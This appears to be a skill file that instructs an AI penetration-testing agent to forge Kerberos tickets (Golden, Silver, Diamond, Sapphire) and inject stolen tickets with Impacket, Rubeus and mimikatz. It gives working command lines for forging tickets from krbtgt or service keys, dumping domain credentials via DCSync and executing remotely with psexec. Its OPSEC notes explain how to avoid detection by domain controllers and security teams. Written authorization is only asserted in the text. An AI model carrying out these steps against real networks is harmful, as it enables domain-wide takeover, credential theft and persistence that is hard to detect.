---
name: kerberos-ticket-forging
description: >
  Forges Kerberos tickets for domain persistence and privilege escalation.
  Covers Golden Ticket (krbtgt hash → forged TGT), Silver Ticket (service hash
  → forged TGS), Diamond Ticket (decrypt/modify/re-encrypt legitimate TGT for
  stealth), Sapphire Ticket (U2U PAC swap), and Pass-the-Ticket injection.
keywords:
  - golden ticket
  - silver ticket
  - diamond ticket
  - sapphire ticket
  - forge ticket
  - forged TGT
  - forged TGS
  - krbtgt hash
  - ticket forging
  - ticketer.py
  - kerberos persistence
  - domain persistence
  - you have krbtgt or service account key material and need domain-wide access or persistence
tools:
  - Impacket (ticketer.py)
  - Rubeus
  - mimikatz
opsec: medium
---

# Kerberos Ticket Forging

You are helping a penetration tester forge Kerberos tickets for domain
persistence and privilege escalation. All testing is under explicit written
authorization.

**Kerberos-first authentication**: Forged tickets are inherently Kerberos.
Use `-k -no-pass` (Impacket) or `--use-kcache` (NetExec) for all operations
with forged tickets.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[kerberos-ticket-forging] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Key material (see decision table below)
- Domain SID (`S-1-5-21-...`)
- Domain FQDN
- Tools: Impacket (`ticketer.py`, `getST.py`, `secretsdump.py`), optionally
  `Rubeus`, `mimikatz`

**Get domain SID**:
```bash
# Impacket
lookupsid.py DOMAIN/user@DC.DOMAIN.LOCAL -k -no-pass | head -1

# bloodyAD
bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL get object \
  'DC=DOMAIN,DC=LOCAL' --attr objectSid

# PowerView
Get-DomainSID
```

## Step 1: Choose Ticket Type

| Material Available | Ticket Type | OPSEC | Go To |
|-------------------|-------------|-------|-------|
| krbtgt AES256 + legit creds | **Diamond** | **LOW** | Step 4 |
| krbtgt AES256 + S4U2Self | **Sapphire** | **LOW** | Step 5 |
| krbtgt NTLM or AES | **Golden** | **HIGH** | Step 2 |
| Service account AES/NTLM | **Silver** | **MEDIUM** | Step 3 |
| Stolen .ccache/.kirbi | **Pass-the-Ticket** | **LOW** | Step 6 |

**Always prefer Diamond > Sapphire > Silver > Golden** when key material allows.

Golden tickets are the most powerful but most detectable. Diamond tickets
provide the same access with significantly better stealth.

## Step 2: Golden Ticket

**Concept**: Forge a TGT using the krbtgt key. Grants access to any service
as any user in the domain.

**Required material**: krbtgt NTLM hash or AES256 key + domain SID.

### Impacket (Linux)

```bash
# With AES256 (preferred — matches domain encryption policy)
ticketer.py -aesKey KRBTGT_AES256 \
  -domain-sid S-1-5-21-XXX-YYY-ZZZ \
  -domain DOMAIN.LOCAL \
  Administrator

# With NTLM hash (RC4 — detectable in AES-enforced domains)
ticketer.py -nthash KRBTGT_NTHASH \
  -domain-sid S-1-5-21-XXX-YYY-ZZZ \
  -domain DOMAIN.LOCAL \
  Administrator

# With extra SIDs (cross-forest Enterprise Admins)
ticketer.py -aesKey KRBTGT_AES256 \
  -domain-sid S-1-5-21-XXX-YYY-ZZZ \
  -domain DOMAIN.LOCAL \
  -extra-sid S-1-5-21-FOREST-SID-519 \
  Administrator

# Inject and use
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass DOMAIN/Administrator@DC.DOMAIN.LOCAL -just-dc
psexec.py -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN.LOCAL
```

### Rubeus (Windows)

```powershell
# Forge and inject
.\Rubeus.exe golden /aes256:KRBTGT_AES256 \
  /user:Administrator /id:500 \
  /domain:DOMAIN.LOCAL /sid:S-1-5-21-XXX-YYY-ZZZ \
  /ldap /nowrap /ptt
```

### Mimikatz (Windows)

```
# Forge golden ticket with realistic lifetime
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL \
  /sid:S-1-5-21-XXX-YYY-ZZZ \
  /aes256:KRBTGT_AES256 \
  /id:500 /groups:512,513,518,519,520 \
  /startoffset:0 /endin:600 /renewmax:10080 \
  /ptt
```

### OPSEC Notes — Golden Ticket

- **High detectability**: No preceding Event 4768 (AS-REQ) on the DC — the
  ticket was forged offline, so the KDC never issued it
- Mimikatz default 10-year lifetime is a major indicator — use `/endin:600`
  (10 hours) and `/renewmax:10080` (7 days) for realistic values
- Query domain policy for actual values:
  ```powershell
  Get-DomainPolicy | select -expand KerberosPolicy
  ```
- RC4 encryption (etype 0x17) is anomalous in AES-enforced domains
- **Use Diamond Ticket instead** (Step 4) for stealth

## Step 3: Silver Ticket

**Concept**: Forge a TGS for a specific service using the service account's
key. Access is limited to that service — no KDC contact needed.

**Required material**: Service account AES256 key or NTLM hash + domain SID.

### Impacket (Linux)

```bash
# With AES256 (mandatory for modern domains post-KB5021131)
ticketer.py -aesKey SERVICE_AES256 \
  -domain-sid S-1-5-21-XXX-YYY-ZZZ \
  -domain DOMAIN.LOCAL \
  -spn cifs/TARGET.DOMAIN.LOCAL \
  -duration 480 \
  Administrator

# Common SPNs to target
# cifs/host — file shares, psexec
# LDAP/DC   — DCSync
# MSSQLSvc/host:1433 — SQL access
# HTTP/host — web services, WinRM
# HOST/host — scheduled tasks, WMI

export KRB5CCNAME=Administrator.ccache
smbclient.py -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN.LOCAL
```

### Rubeus (Windows)

```powershell
.\Rubeus.exe silver /aes256:SERVICE_AES256 \
  /user:Administrator /id:500 \
  /domain:DOMAIN.LOCAL /sid:S-1-5-21-XXX-YYY-ZZZ \
  /service:cifs/TARGET.DOMAIN.LOCAL \
  /ldap /nowrap /ptt
```

### Mimikatz (Windows)

```
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL \
  /sid:S-1-5-21-XXX-YYY-ZZZ \
  /aes256:SERVICE_AES256 \
  /service:cifs /target:TARGET.DOMAIN.LOCAL /ptt
```

### Common Silver Ticket Targets

| SPN | Access | Exploit |
|-----|--------|---------|
| `cifs/DC` | SMB shares, psexec | `psexec.py -k -no-pass` |
| `LDAP/DC` | DCSync | `secretsdump.py -k -no-pass -just-dc` |
| `HOST/target` | WMI, schtasks | `wmiexec.py -k -no-pass` |
| `HTTP/target` | WinRM | `evil-winrm` with ticket |
| `MSSQLSvc/host:1433` | SQL Server | `mssqlclient.py -k -no-pass` |
| `RPCSS/target` | DCOM | `dcomexec.py -k -no-pass` |

### OPSEC Notes — Silver Ticket

- **Medium**: No AS-REQ to KDC — ticket presented directly to service
- Service validates ticket with its own key — no KDC logging for the TGS
- RC4 encryption will fail in AES-enforced environments (KB5021131)
- Always extract AES256 keys, not just NTLM hashes
- Use realistic `-duration` (e.g., 480 minutes = 8 hours)
- gMSA/computer account keys rotate every 30 days — re-extract if stale

## Step 4: Diamond Ticket

**Concept**: Request a legitimate TGT, decrypt it with the krbtgt key, modify
the PAC (add privileged groups), re-encrypt. The DC sees a real AS-REQ/AS-REP
flow — no 4768 gap detection.

**Required material**: krbtgt AES256 key + valid domain credentials (any user).

### Impacket (Linux)

```bash
# Request real TGT, modify PAC, re-encrypt
ticketer.py -request \
  -domain DOMAIN.LOCAL \
  -user lowpriv_user \
  -password 'UserPassword!' \
  -aesKey KRBTGT_AES256 \
  -domain-sid S-1-5-21-XXX-YYY-ZZZ \
  -user-id 500 \
  -groups 512,513,518,519,520 \
  target_admin

export KRB5CCNAME=target_admin.ccache
secretsdump.py -k -no-pass DOMAIN/target_admin@DC.DOMAIN.LOCAL -just-dc
```

### Rubeus (Windows)

```powershell
# /tgtdeleg obtains a legit TGT without needing credentials
# /opsec forces AES and realistic AS-REQ flow
# /ldap auto-populates PAC attributes from AD
.\Rubeus.exe diamond /tgtdeleg \
  /ticketuser:Administrator /ticketuserid:500 \
  /groups:512,513,518,519,520 \
  /krbkey:KRBTGT_AES256 \
  /ldap /opsec /nowrap /ptt

# Alternative: re-cut a service ticket from TGT (avoids hitting KDC again)
.\Rubeus.exe diamond /ticket:BASE64_TGT \
  /service:cifs/DC.DOMAIN.LOCAL \
  /servicekey:SERVICE_AES256 \
  /ticketuser:Administrator /ticketuserid:500 \
  /ldap /opsec /nowrap /ptt
```

### OPSEC Notes — Diamond Ticket

- **Low detectability**: Legitimate 4768 AS-REQ + 4769 TGS-REQ flow present
- PAC inherits realistic policy values from the DC
- `/ldap` and `/opsec` flags auto-populate device IDs, logon hours, claims
- **Remaining detection**: PAC group membership anomalies (user claims to be
  in groups they don't belong to) — only add plausible groups
- Always use AES256 — RC4 Diamond tickets defeat the purpose
- **Preferred over Golden Ticket** in any scenario where you have valid creds

## Step 5: Sapphire Ticket

**Concept**: Combine Diamond TGT + S4U2Self + User-to-User (U2U) to obtain a
legitimate PAC from a privileged user, then splice it into your TGT. The wire
flow looks like a U2U exchange.

**Required material**: krbtgt AES256 key + valid domain credentials.

### Impacket (Linux)

```bash
# Request legit TGT, perform U2U S4U2Self for privileged user's PAC
ticketer.py -request \
  -impersonate Administrator \
  -domain DOMAIN.LOCAL \
  -user lowpriv_user \
  -password 'UserPassword!' \
  -aesKey KRBTGT_AES256 \
  -domain-sid S-1-5-21-XXX-YYY-ZZZ \
  target_user

export KRB5CCNAME=target_user.ccache
secretsdump.py -k -no-pass DOMAIN/Administrator@DC.DOMAIN.LOCAL -just-dc
```

### OPSEC Notes — Sapphire Ticket

- **Low detectability** but with a unique fingerprint:
  - `ENC-TKT-IN-SKEY` flag in TGS-REQ (User-to-User mode — rare in normal traffic)
  - `additional-tickets` field in TGS-REQ
  - `sname == cname` in Event 4769 (self-service pattern)
- The PAC is legitimate (from the real privileged user) — no group anomalies
- More detectable than Diamond if SOC monitors for U2U patterns
- Requires Impacket PR#1411 or newer (sapphire support in ticketer.py)

## Step 6: Pass-the-Ticket (Inject Existing Ticket)

**Concept**: Use a stolen or previously forged ticket without re-forging.

### Format Conversion

```bash
# kirbi -> ccache (Windows ticket to Linux)
ticketConverter.py ticket.kirbi ticket.ccache

# ccache -> kirbi (Linux ticket to Windows)
ticketConverter.py ticket.ccache ticket.kirbi
```

### Linux Injection

```bash
export KRB5CCNAME=/path/to/ticket.ccache
klist  # verify

# Use with any Impacket tool
psexec.py -k -no-pass DOMAIN/user@TARGET.DOMAIN.LOCAL
secretsdump.py -k -no-pass DOMAIN/user@DC.DOMAIN.LOCAL

# NetExec
nxc smb TARGET.DOMAIN.LOCAL --use-kcache -x "whoami"
```

### Windows Injection

```powershell
# Rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Mimikatz
kerberos::ptt ticket.kirbi

# Verify
klist
```

### OPSEC Notes — PTT

- **Low**: Reusing a legitimate ticket — appears as normal Kerberos auth
- Risk: ticket may be logged from an unexpected source IP
- Ticket lifetime applies — re-request if expired

## Step 7: Escalate or Pivot

STOP and return to the orchestrator with:
- What was achieved (RCE, creds, file read, etc.)
- New credentials, access, or pivot paths discovered
- Context for next steps (platform, access method, working payloads)

## Troubleshooting

### KDC_ERR_ETYPE_NOTSUPP (Silver Ticket Fails)

RC4 service ticket rejected — domain enforces AES (KB5021131, phased enforcement
since Nov 2022). Extract AES256 key for the service account instead of NTLM hash.

### Golden Ticket Works but No DCSync

The forged TGT grants access but DCSync requires specific group memberships.
Ensure the ticket includes:
- Domain Admins (512) or
- Enterprise Admins (519) or
- Replication rights (manually granted)

### Diamond Ticket: "No Credentials Supplied"

The `-request` flag requires valid credentials to request the initial legitimate
TGT. Use `-user` and `-password` (or `-hashes`/`-aesKey` of a real user).

### Ticket Lifetime Expired

Default TGT lifetime is 10 hours. Re-forge if expired:
```bash
# Check expiration
klist -c ticket.ccache
```

### PAC Validation Failures (Modern DCs)

Post-2024 PAC validation checks for impossible group combinations. Mitigation:
- Use `/ldap` flag (Rubeus) to populate realistic PAC attributes
- Only add groups the impersonated user could plausibly hold
- Diamond/Sapphire tickets inherit real PAC values — less likely to fail

### krbtgt Key Rotation

If krbtgt password was rotated, old Golden/Diamond tickets stop working. The
previous krbtgt key works until the second rotation (AD keeps `n-1` key).
Check rotation history:
```powershell
Get-ADUser krbtgt -Properties PasswordLastSet
```

### KRB_AP_ERR_SKEW (Clock Skew)

Kerberos requires clocks within 5 minutes of the DC. This is a **Clock Skew
Interrupt** — stop immediately and return to the orchestrator. Do not retry or
fall back to NTLM. The fix requires root:
```bash
sudo ntpdate DC_IP
# or
sudo rdate -n DC_IP
```

### Ticket Type Comparison

| Ticket | Key Material | Scope | Detectability | Survives krbtgt Rotation |
|--------|-------------|-------|---------------|--------------------------|
| Golden | krbtgt hash/AES | Any user, any service | **HIGH** (4768 gap) | No (after 2nd rotation) |
| Silver | Service hash/AES | Single service | **MEDIUM** (no KDC log) | N/A (service key) |
| Diamond | krbtgt AES + creds | Any user, any service | **LOW** (normal flow) | No (after 2nd rotation) |
| Sapphire | krbtgt AES + creds | Any user, any service | **LOW** (U2U fingerprint) | No (after 2nd rotation) |
| PTT | Stolen ticket | Ticket's scope | **LOW** (replay) | N/A (already issued) |
